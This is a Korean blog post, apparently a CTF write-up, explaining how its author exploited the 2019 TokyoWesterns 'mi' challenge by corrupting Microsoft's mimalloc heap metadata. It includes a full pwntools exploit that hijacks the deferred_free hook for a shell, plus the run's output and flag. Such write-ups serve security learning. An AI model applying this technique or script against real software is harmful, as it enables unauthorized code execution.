---
layout:     post
title:      "2019 TokyoWesterns CTF mi write up"
subtitle:   "2019 TokyoWesterns CTF pwnable"
date:       2019-09-04
author:     "NextLine"
header-img: "img/post-bg-1.png"
tags:
    - WriteUp
---

# 2019 TokyoWesterns CTF mi write up

### Intro

대회때 포너블은 gnote와 mi 만 못풀었다. 이 두 문제중에서 내가 잡았던 문제는 mi 였는데 왜 못풀었는지 돌아볼겸 write-up을 작성해 보려고 한다. 일단 문제를 못푼건 몇가지 이유가 있었는데 가장 큰 이유는 정확히 분석하지 않고 너무 감에 의존해서 그런것 같다.<br>
48시간 대회특성상 오랜시간동안 문제를 봐야하기 때문에 대회 후반에 문제를 6~7시간 넘게 잡고있다보면 멘탈이 깨져서 점점 효율이 떨어지는것같다. 특히 꽤 많은양의 소스가 있는 이런 문제는 시간이 지날수록 점점 새로운걸 안보게되고 무의식적으로 알고있는 사실로만 exploit 하려고 했던것 같다. 그리고 이게 또 될듯 말듯 해서 더 삽질만 하고 결국엔 못풀었다. 역시 조금 느리긴 해도 완벽히 분석을 하는 습관을 기르는게 중요한 것 같다.

### Binary

```
1.  Create
2.  Write
3.  Read
4.  Delete
>>
```
메뉴는 4가지로 구성되어 있다.

1. create : 원하는 index (0~7)에 mi_malloc으로 block을 할당한다.
2. write : 원하는 index(0~7)에 할당한 size만큼 데이터를 쓴다.
3. read : 원하는 index(0~7)에 puts로 데이터를 출력한다.
4. delete : 원하는 index(0~7)에 mi_free로 block을 해제한다.

사실 이 문제는 바이너리가 중요한게 아니라 mimalloc이 중요하다. mimalloc의 경우 https://github.com/microsoft/mimalloc 에서 확인할 수 있다. 또한 https://www.microsoft.com/en-us/research/uploads/prod/2019/06/mimalloc-tr-v1.pdf 이 문서도 mimalloc을 전반적으로 이해하는데 큰 도움을 주었다.

### Exploit

문서를 참고하면 전체 heap layout에 대해 이해할 수 있는데 이걸 보면서 exploit idea를 생각했다. 이미 바이너리에서 heap overflow, use-after-free, double free 등 heap에서 발생할 수 있는 대부분의 버그들을 사용할 수 있었기 때문에 이것을 통해 어떻게 exploit을 할지 생각해야했다.

```c
extern inline void* mi_heap_malloc(mi_heap_t* heap, size_t size) mi_attr_noexcept {
  mi_assert(heap!=NULL);
  mi_assert(heap->thread_id == 0 || heap->thread_id == _mi_thread_id()); // heaps are thread local
  void* p;
  if (mi_likely(size <= MI_SMALL_SIZE_MAX)) {
    p = mi_heap_malloc_small(heap, size);
  }
  else {
    p = _mi_malloc_generic(heap, size);
  }
  #if MI_STAT>1
  if (p != NULL) {
    if (!mi_heap_is_initialized(heap)) { heap = mi_get_default_heap(); }
    mi_heap_stat_increase( heap, malloc, mi_good_size(size) );  // overestimate for aligned sizes
  }
  #endif
  return p;
}
```
block은 size에 따라 1024, 65536을 기준으로 3가지 page에 할당된다. 여기서 size가 1024보다 작은 block들이 존재하는 page에는 아직 할당되지 않은 block들이 single linked list로 연결되어 있다. <br>
따라서 heap overflow를 통해 block의 fd를 덮어 원하는 메모리 주소를 free-list(= list of available free blocks)에 넣어줄 수 있다.

```c
static inline mi_page_t* mi_find_free_page(mi_heap_t* heap, size_t size) {
  mi_page_queue_t* pq = mi_page_queue(heap,size);
  mi_page_t* page = pq->first;
  if (page != NULL) {
    if (mi_option_get(mi_option_secure) >= 3 && page->capacity < page->reserved && ((_mi_heap_random(heap) & 1) == 1)) {
      // in secure mode, we extend half the time to increase randomness
      mi_page_extend_free(heap, page, &heap->tld->stats);
      mi_assert_internal(mi_page_immediate_available(page));
    }
    else {
      _mi_page_free_collect(page);
    }
    if (mi_page_immediate_available(page)) {
      return page; // fast path
    }
  }
  return mi_page_queue_find_free_ex(heap, pq);
}
```
또한 small page가 free리스트를 다 쓰거나 medium block (size<65536)을 free하고 다시 할당할 경우에 mi_find_free_page 함수에서 free된 block들을 page->free로 옮겨준다.<br>
전과 비슷하게 use-after-free 취약점을 이용하여 free된 block의 fd를 원하는 주소로 변경하면 free-list를 조작할 수 있다.

```c
extern inline void* _mi_page_malloc(mi_heap_t* heap, mi_page_t* page, size_t size) mi_attr_noexcept {
  mi_assert_internal(page->block_size==0||page->block_size >= size);
  mi_block_t* block = page->free;
  if (mi_unlikely(block == NULL)) {
    return _mi_malloc_generic(heap, size); // slow path
  }
  mi_assert_internal(block != NULL && _mi_ptr_page(block) == page);
  // pop from the free list
  page->free = mi_block_next(page,block);
  page->used++;
  mi_assert_internal(page->free == NULL || _mi_ptr_page(page->free) == page);
#if (MI_DEBUG)
  memset(block, MI_DEBUG_UNINIT, size);
#elif (MI_SECURE)
  block->next = 0;
#endif
#if (MI_STAT>1)
  if(size <= MI_LARGE_SIZE_MAX) {
    size_t bin = _mi_bin(size);
    mi_heap_stat_increase(heap,normal[bin], 1);
  }
#endif
  return block;
}
```
하지만 free-list에 존재한다고 전부다 할당할 수 있는건 아니다. 그 이유는 `_mi_page_malloc` 에서 `_mi_ptr_page` 함수를 통해 page->free와 다음 할당될 block이 유효한지 검사하기 때문이다. (assert가 적용된 상태로 컴파일됨)

```c
// Get the page containing the pointer
static inline mi_page_t* _mi_ptr_page(void* p) {
  return _mi_segment_page_of(_mi_ptr_segment(p), p);
}

// Segment that contains the pointer
static inline mi_segment_t* _mi_ptr_segment(const void* p) {
  // mi_assert_internal(p != NULL);
  return (mi_segment_t*)((uintptr_t)p & ~MI_SEGMENT_MASK);
}

// Get the page containing the pointer
static inline mi_page_t* _mi_segment_page_of(const mi_segment_t* segment, const void* p) {
  // if (segment->page_size > MI_SEGMENT_SIZE) return &segment->pages[0];  // huge pages
  ptrdiff_t diff = (uint8_t*)p - (uint8_t*)segment;
  mi_assert_internal(diff >= 0 && diff < MI_SEGMENT_SIZE);
  uintptr_t idx = (uintptr_t)diff >> segment->page_shift;
  mi_assert_internal(idx < segment->capacity);
  mi_assert_internal(segment->page_kind <= MI_PAGE_MEDIUM || idx == 0);
  return &((mi_segment_t*)segment)->pages[idx];
}
```

따라서 `_mi_ptr_page` 함수를 우회해야만 원하는대로 block을 할당할 수 있다. 이 함수에서는 `(block pointer & 0xffffffffffc00000)` 를 segment로 판단하기 때문에 유효한 block pointer가 아니면 crash가 발생하거나 제대로 page를 찾을 수 없어 abort가 발생한다. 여기까지 할수있는 것을 정리하면 아래와 같다.

1. (기본) free된 chunk의 fd를 출력하여 heap leak을 얻을 수 있다.
2. heap overflow를 통해 small block page를 덮으면 single linked list를 조작하여 free-list에 원하는 메모리 주소를 넣을 수 있다.
3. use-after-free를 통해 free된 medium block의 fd를 덮으면 free된 page를 수집하는 과정에서 free-list에 원하는 메모리 주소를 넣을 수 있다.
4. _mi_ptr_page 함수가 block의 유효성을 검증하므로 같은 segment와 page에 존재하는 메모리만 free-list에 넣고 할당받을 수 있다.

하지만 유효한 block 메모리를 읽고 쓰는것만으로는 exploit을 할 수 없기 때문에 현재 상황에서 어떻게 원하는 주소에 원하는 값을 쓸 수 있을지 생각해야한다. (memory leak 경우 이미 uaf를 통해 얻을 수 있다.)

```
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555554000     0x555555556000 r-xp     2000 0      /home/youngjoo/tokyo/pwn7/mi
    0x555555755000     0x555555756000 r--p     1000 1000   /home/youngjoo/tokyo/pwn7/mi
    0x555555756000     0x555555757000 rw-p     1000 2000   /home/youngjoo/tokyo/pwn7/mi
    0x7fffe7400000     0x7ffff7400000 rw-p 10000000 0
    0x7ffff759b000     0x7ffff75bd000 r-xp    22000 0      /lib/x86_64-linux-gnu/libmimalloc.so
    0x7ffff75bd000     0x7ffff77bd000 ---p   200000 22000  /lib/x86_64-linux-gnu/libmimalloc.so
    0x7ffff77bd000     0x7ffff77be000 r--p     1000 22000  /lib/x86_64-linux-gnu/libmimalloc.so
    0x7ffff77be000     0x7ffff77c0000 rw-p     2000 23000  /lib/x86_64-linux-gnu/libmimalloc.so
```

위의 메모리 맵을 보면 mimalloc의 block이 할당되는 위치가 0x7fffe7400000임을 알 수 있다.

```
pwndbg> x/30gx 0x7fffe7400000
0x7fffe7400000: 0x0000000000000000      0x0000000000000000
0x7fffe7400010: 0x0000000000000000      0x0000000000000000
0x7fffe7400020: 0x0000000000000001      0x0000000000000040
0x7fffe7400030: 0x0000000000400000      0x0000000000001680
0x7fffe7400040: 0xc679788a6e294b58      0x0000000000000000
0x7fffe7400050: 0x0000000000000010      0x00007ffff7fdd740
0x7fffe7400060: 0x0000000000000000      0x002e000300000500
0x7fffe7400070: 0x00007fffe7402100      0xd98e7ce6c3f08d95
0x7fffe7400080: 0x0000000000000002      0x0000000000000000
0x7fffe7400090: 0x0000000000000000      0x0000000000000000
0x7fffe74000a0: 0x0000000000000500      0x00007ffff77be3c0
0x7fffe74000b0: 0x0000000000000000      0x0000000000000000
0x7fffe74000c0: 0x0000000000000401      0x0000000000000000
0x7fffe74000d0: 0x0000000000000000      0x0000000000000000
0x7fffe74000e0: 0x0000000000000000      0x0000000000000000
```
메모리를 확인해보면 segment와 page들이 존재한다. 하지만 여기서 아무 block이나 할당하게 되면 segment와 page가 존재하는 영역 이후에 할당된다. 그리고 더 할당하게 되면 다음 페이지에 계속해서 할당한다. 예를들면 아래와 같다.

1. 0x500 할당 : 0x7fffe7401700
2. 0x30 할당 : 0x7fffe7410000
3. 0x30 할당 : 0x7fffe7410030
4. 0x60 할당 : 0x7fffe7420000

이런식으로 같은 사이즈의 block은 같은 page area에 할당되며 다르면 새로운 page가 생성된다. 이것을 통해 알 수 있는 점은 처음에 할당되는 page area가 segment, page가 존재하는 영역과 동일하다는 사실이다. 즉 첫번째 page area에 존재하는 block의 free-list를 segment, 혹은 page 데이터가 있는 주소로 덮어써서 할당해도 `_mi_ptr_page` 함수를 통과해 할당에 성공한다는 점이다.

```c
typedef struct mi_page_s {
  // "owned" by the segment
  uint8_t               segment_idx;       // index in the segment `pages` array, `page == &segment->pages[page->segment_idx]`
  bool                  segment_in_use:1;  // `true` if the segment allocated this page
  bool                  is_reset:1;        // `true` if the page memory was reset
  bool                  is_committed:1;    // `true` if the page virtual memory is committed

  // layout like this to optimize access in `mi_malloc` and `mi_free`
  mi_page_flags_t       flags;
  uint16_t              capacity;          // number of blocks committed
  uint16_t              reserved;          // number of blocks reserved in memory

  mi_block_t*           free;              // list of available free blocks (`malloc` allocates from this list)
  uintptr_t             cookie;            // random cookie to encode the free lists
  size_t                used;              // number of blocks in use (including blocks in `local_free` and `thread_free`)

  mi_block_t*           local_free;        // list of deferred free blocks by this thread (migrates to `free`)
  volatile uintptr_t    thread_freed;      // at least this number of blocks are in `thread_free`
  volatile mi_thread_free_t thread_free;   // list of deferred free blocks freed by other threads

  // less accessed info
  size_t                block_size;        // size available in each block (always `>0`)
  mi_heap_t*            heap;              // the owning heap
  struct mi_page_s*     next;              // next page owned by this thread with the same `block_size`
  struct mi_page_s*     prev;              // previous page owned by this thread with the same `block_size`

// improve page index calculation
#if MI_INTPTR_SIZE==8
  //void*                 padding[1];        // 10 words on 64-bit
#elif MI_INTPTR_SIZE==4
  void*                 padding[1];          // 12 words on 32-bit
#endif
} mi_page_t;
```
그러므로 free-list를 조작해 segment와 page 데이터에 자유롭게 접근하여 읽거나 쓰는것이 가능하다. 이것을 통해 page->heap을 leak하여 libc주소를 얻을 수 있다. 이후에는 page의 page->free와 page->thread_free를 수정하여 exploit을 할 수 있는데 먼저 `_mi_page_free_collect` 함수를 알아야 한다.

```c
void _mi_page_free_collect(mi_page_t* page) {
  mi_assert_internal(page!=NULL);
  //if (page->free != NULL) return; // avoid expensive append

  // free the local free list
  if (page->local_free != NULL) {
    if (mi_likely(page->free == NULL)) {
      // usual case
      page->free = page->local_free;
    }
    else {
      mi_block_t* tail = page->free;
      mi_block_t* next;
      while ((next = mi_block_next(page, tail)) != NULL) {
        tail = next;
      }
      mi_block_set_next(page, tail, page->local_free);
    }
    page->local_free = NULL;
  }
  // and the thread free list
  if (mi_tf_block(page->thread_free) != NULL) {  // quick test to avoid an atomic operation
    mi_page_thread_free_collect(page);
  }
}
```
free된 page를 수집하는 `_mi_page_free_collect` 함수를 보면 thread_free가 있을 경우 `mi_page_thread_free_collect` 함수를 호출하는 것을 확인할 수 있다.

```c
static void mi_page_thread_free_collect(mi_page_t* page)
{
  mi_block_t* head;
  mi_thread_free_t tfree;
  mi_thread_free_t tfreex;
  do {
    tfree = page->thread_free;
    head = mi_tf_block(tfree);
    tfreex = mi_tf_set_block(tfree,NULL);
  } while (!mi_atomic_compare_exchange((volatile uintptr_t*)&page->thread_free, tfreex, tfree));

  // return if the list is empty
  if (head == NULL) return;

  // find the tail
  uint16_t count = 1;
  mi_block_t* tail = head;
  mi_block_t* next;
  while ((next = mi_block_next(page,tail)) != NULL) {
    count++;
    tail = next;
  }

  // and prepend to the free list
  mi_block_set_next(page,tail, page->free);
  page->free = head;

  // update counts now
  mi_atomic_subtract(&page->thread_freed, count);
  page->used -= count;
}
```

`mi_page_thread_free_collect` 에서는 page->thread_free의 마지막 포인터(tail)에 page->free를 쓰고 page->free는 page->thread_free의 가장 처음 포인터(head)를 넣어준다. 그러므로 취약점을 이용해 tail(page->thread_free)에 원하는 메모리 주소를 넣고 page->free에 덮어 쓸 메모리 주소를 넣으면 원하는 메모리에 원하는 값을 써줄 수 있다.

```c
 while ((next = mi_block_next(page,tail)) != NULL) {
    count++;
    tail = next;
  }
```
여기서 유의할 점은 위의 루틴때문에 page->thread_free의 tail을 원하는 메모리로 설정하려면 그 메모리가 null을 가리키고 있어야 한다. 그래서 null을 가리키고있는 원하는 메모리를 원하는 값으로 쓸 수 있게된다.

```c
// Generic allocation routine if the fast path (`alloc.c:mi_page_malloc`) does not succeed.
void* _mi_malloc_generic(mi_heap_t* heap, size_t size) mi_attr_noexcept
{
  mi_assert_internal(heap != NULL);

  // initialize if necessary
  if (mi_unlikely(!mi_heap_is_initialized(heap))) {
    mi_thread_init(); // calls `_mi_heap_init` in turn
    heap = mi_get_default_heap();
  }
  mi_assert_internal(mi_heap_is_initialized(heap));

  // call potential deferred free routines
  _mi_deferred_free(heap, false);
  ...
  ...
```
```c
static mi_deferred_free_fun* deferred_free = NULL;

void _mi_deferred_free(mi_heap_t* heap, bool force) {
  heap->tld->heartbeat++;
  if (deferred_free != NULL) {
    deferred_free(force, heap->tld->heartbeat);
  }
}
```

`_mi_malloc_generic` 함수를 보면 mi_deferred_free 함수를 호출하는데 이 함수는 전역변수 deferred_free 의 값이 null이 아니면 이 함수를 실행시켜주는 역할을 한다. 이미 우리는 null을 가리키는 메모리에 원하는 값을 쓸 수 있으므로 deferred_free을 libc의 oneshot gadget으로 바꿔주면 다음 할당때 shell을 획득할 수 있다.<br>
주의할 점은 head를 유효한 chunk로 넣어주어야 abort를 내지 않고 exploit할 수 있다.

### Exploit Code

```python
from pwn import *

def conn():
    s = remote('mi.chal.ctf.westerns.tokyo',10001)
    return s

s = conn()
def create(idx, size):
    s.sendlineafter('>>', '1')
    s.sendlineafter('number\n', str(idx))
    s.sendlineafter('size\n', str(size))

def write(idx, content):
    s.sendlineafter('>>', '2')
    s.sendlineafter('number\n', str(idx))
    s.sendafter('value\n', str(content))

def read(idx):
    s.sendlineafter('>>', '3')
    s.sendlineafter('number\n', str(idx))

def free(idx):
    s.sendlineafter('>>', '4')
    s.sendlineafter('number\n', str(idx))

create(0, 0x500)
free(0)
create(1, 0x38)
create(2, 0x38)
free(2)
free(1)
read(1)
heap = u64(s.recv(6) + '\x00' * 2) - 0x16c0
s.info("heap @ " + hex(heap))

write(0, p64(heap + 0xc8).ljust(0x500, '\x00'))
create(1, 0x38)
create(1, 0x38)
write(1, '\x00' * 0x38)
create(3, 0x600)
write(1, 'A' * 0x38)
read(1)
s.recvuntil('A' * 0x38)
milibc = u64(s.recv(6) + '\x00' * 2) - 0x2233c0
libc = milibc + 0x22a000
s.info("milibc @ " + hex(milibc))
s.info("libc @ " + hex(libc))

fake_chunk_addr = heap + 0x10000
fake_chunk = p64(fake_chunk_addr + 8) + p64(milibc + 0x228970)
write(3, fake_chunk.ljust(0x600, '\x00'))

s.info("fake chunk  @ " + hex(fake_chunk_addr))
pay = p64(libc + 0x10a38c) + p64(0x1111111122222222) + p64(0x1)
pay += p64(0) + p64(0) + p64(fake_chunk_addr) + p64(0x600)
write(1, pay)

create(1, 0x600)
create(2, 0x600) # get shell
s.interactive()
# TWCTF{mi_miii_mee_mean_nomeaning}
```


```
Interrupt: Press ENTER or type command to continue
[+] Opening connection to mi.chal.ctf.westerns.tokyo on port 10001: Done
[*] heap @ 0x7fbbe5400000
[*] milibc @ 0x7fbbf549c000
[*] libc @ 0x7fbbf56c6000
[*] fake chunk  @ 0x7fbbe5410000
[*] Switching to interactive mode
$ id
uid=9400(mi) gid=40000(mi) groups=40000(mi)
$ cat /home/*/flag
TWCTF{mi_miii_mee_mean_nomeaning}
$
```
